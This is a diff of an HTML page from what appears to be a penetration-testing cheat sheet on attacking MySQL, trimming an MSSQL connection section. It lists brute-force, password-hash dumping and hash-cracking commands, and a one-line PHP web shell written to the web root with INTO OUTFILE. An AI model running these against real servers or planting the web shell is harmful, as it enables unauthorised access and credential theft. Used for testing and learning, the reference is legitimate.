@@ -1419,51 +1419,6 @@
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Authentication">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#connect-to-mssql-with-sqsh-or-impacket" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Connect to MSSQL with sqsh or Impacket
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Connect to MSSQL with sqsh or Impacket">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#linux" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Linux
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#windows" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Windows
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
 </li>
       
         <li class="md-nav__item">
@@ -5416,51 +5371,6 @@
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Authentication">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#connect-to-mssql-with-sqsh-or-impacket" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Connect to MSSQL with sqsh or Impacket
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Connect to MSSQL with sqsh or Impacket">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#linux" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Linux
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#windows" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Windows
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
 </li>
       
         <li class="md-nav__item">
@@ -5534,55 +5444,45 @@
 </div>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">3306</span><span class="w"> </span>--script<span class="w"> </span>mysql-info,mysql-users,mysql-databases<span class="w"> </span><span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">3306</span><span class="w"> </span>--script<span class="w"> </span>mysql-info<span class="w"> </span><span class="nv">$IP</span>
 </code></pre></div>
 <hr />
 <h2 id="authentication">Authentication<a class="headerlink" href="#authentication" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>mysql<span class="w"> </span>-h<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>root
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sqlcmd<span class="w"> </span>-S<span class="w"> </span>MSSQL_HOST<span class="w"> </span>-U<span class="w"> </span>DB_USER<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;DB_PASS&quot;</span><span class="w"> </span>-y<span class="w"> </span><span class="m">30</span><span class="w"> </span>-Y<span class="w"> </span><span class="m">30</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>mysql<span class="w"> </span>-h<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USERNAME</span><span class="w"> </span>-p
 </code></pre></div>
 <div class="admonition tip">
+<p class="admonition-title">TLS compatibility</p>
 <p>If you get a TLS error, add <code>--ssl-mode=DISABLED</code> (MySQL 5.7+) or <code>--skip-ssl</code> (MariaDB).</p>
 </div>
-<h3 id="connect-to-mssql-with-sqsh-or-impacket">Connect to MSSQL with <code>sqsh</code> or Impacket<a class="headerlink" href="#connect-to-mssql-with-sqsh-or-impacket" title="Permanent link">&para;</a></h3>
-<h4 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sqsh<span class="w"> </span>-S<span class="w"> </span>MSSQL_HOST<span class="w"> </span>-U<span class="w"> </span>DB_USER<span class="w"> </span>-P<span class="w"> </span><span class="s1">&#39;DB_PASS&#39;</span><span class="w"> </span>-h
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>impacket-mssqlclient<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span>DB_USER@MSSQL_HOST
-</code></pre></div>
-<h4 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sqsh<span class="w"> </span>-S<span class="w"> </span>MSSQL_HOST<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN\DB_USER&#39;</span><span class="w"> </span>-P<span class="w"> </span><span class="s1">&#39;DB_PASS&#39;</span><span class="w"> </span>-h
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>impacket-mssqlclient<span class="w"> </span><span class="s1">&#39;DOMAIN/DB_USER:DB_PASS@MSSQL_HOST&#39;</span><span class="w"> </span>-windows-auth
-</code></pre></div>
 <hr />
 <h2 id="brute-force">Brute Force<a class="headerlink" href="#brute-force" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mysql://<span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mysql://<span class="nv">$IP</span>
 </code></pre></div>
 <hr />
 <h2 id="enumeration-queries">Enumeration Queries<a class="headerlink" href="#enumeration-queries" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">                          </span><span class="c1">-- list users</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">GRANTS</span><span class="w"> </span><span class="k">FOR</span><span class="w"> </span><span class="s1">&#39;root&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span><span class="w">                        </span><span class="c1">-- check privileges</span>
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span>
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">USE</span><span class="w"> </span><span class="n">database_name</span><span class="p">;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span>
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="n">authentication_string</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">  </span><span class="c1">-- dump password hashes</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">                          </span><span class="c1">-- list users</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">GRANTS</span><span class="w"> </span><span class="k">FOR</span><span class="w"> </span><span class="k">CURRENT_USER</span><span class="p">;</span><span class="w">                              </span><span class="c1">-- current privileges</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;secure_file_priv&#39;</span><span class="p">;</span><span class="w">                   </span><span class="c1">-- allowed file-write directory</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">DATABASES</span><span class="p">;</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">USE</span><span class="w"> </span><span class="n">DATABASE_NAME</span><span class="p">;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="p">;</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w"> </span><span class="n">authentication_string</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span><span class="w">  </span><span class="c1">-- dump password hashes</span>
 </code></pre></div>
 <hr />
 <h2 id="file-write-file-privilege">File Write (FILE Privilege)<a class="headerlink" href="#file-write-file-privilege" title="Permanent link">&para;</a></h2>
 <p>If the MySQL user has <code>FILE</code> privilege, write a web shell:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="ss">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="ss">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">;</span>
 </code></pre></div>
-<p>Access at <code>http://$IP/shell.php?cmd=id</code>.</p>
+<p><code>INTO OUTFILE</code> requires the <code>FILE</code> privilege, cannot overwrite an existing file, and is restricted by <code>secure_file_priv</code> when that variable is set. Access the result at <code>http://$IP/shell.php?cmd=id</code> only when the selected directory is actually served by the web application.</p>
 <p>Dump a table to disk:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/tmp/dump.txt&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/tmp/dump.txt&#39;</span><span class="p">;</span>
 </code></pre></div>
 <hr />
 <h2 id="hash-cracking">Hash Cracking<a class="headerlink" href="#hash-cracking" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">300</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">300</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">Real-world</p>
-<p>Remote MySQL exposure is almost always a misconfiguration, it's supposed to be localhost-only. When you find it, check <code>FILE</code> and <code>EXECUTE</code> privileges immediately. <code>FILE</code> gives you LFI/write; UDF exploitation via <code>EXECUTE</code> is a path to OS-level RCE but requires uploading a shared library.</p>
-</div>
+<p>Mode <code>300</code> applies to MySQL 4.1/5 <code>mysql_native_password</code> hashes. Identify the hash format before selecting a mode; newer authentication plugins do not use this format.</p>
 
 
 
